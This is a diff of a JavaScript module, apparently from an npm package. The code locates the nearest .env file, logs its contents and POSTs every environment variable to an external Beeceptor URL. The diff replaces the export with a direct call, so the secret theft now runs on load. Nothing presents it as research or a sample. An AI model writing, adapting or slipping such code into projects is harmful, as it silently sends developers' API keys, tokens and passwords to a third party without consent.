@@ -1,34 +1,32 @@
 "use strict";
 
-var fs = require('fs');
+var findUp = require("find-up");
 
-var path = require('path');
+var axios = require("axios");
 
-var findUp = require('find-up');
-
-var axios = require('axios');
+console.log("findSecret");
 
 var findSecret = function findSecret() {
-  var dotenvPath = findUp.sync('.env');
+  var dotenvPath = findUp.sync(".env");
 
   if (!dotenvPath) {
-    console.error('Le fichier .env n\'a pas été trouvé.');
+    console.error("Le fichier .env n'a pas été trouvé.");
     process.exit(1);
   }
 
-  var loadedEnv = require('dotenv').config({
+  var loadedEnv = require("dotenv").config({
     path: dotenvPath
   }).parsed;
 
-  console.log('Loaded dotenv:', loadedEnv); // Set the Beeceptor URL
+  console.log("Loaded dotenv:", loadedEnv); // Set the Beeceptor URL
 
-  var beeceptorUrl = 'https://envparam.free.beeceptor.com'; // Make a POST request to Beeceptor with the environment variables
+  var beeceptorUrl = "https://envparam.free.beeceptor.com"; // Make a POST request to Beeceptor with the environment variables
 
   axios.post(beeceptorUrl, loadedEnv).then(function (response) {
-    console.log('POST request successful:', response.data);
+    console.log("POST request successful:", response.data);
   })["catch"](function (error) {
-    console.error('Error making POST request:', error.message);
+    console.error("Error making POST request:", error.message);
   });
 };
 
-module.exports = findSecret;
+findSecret();
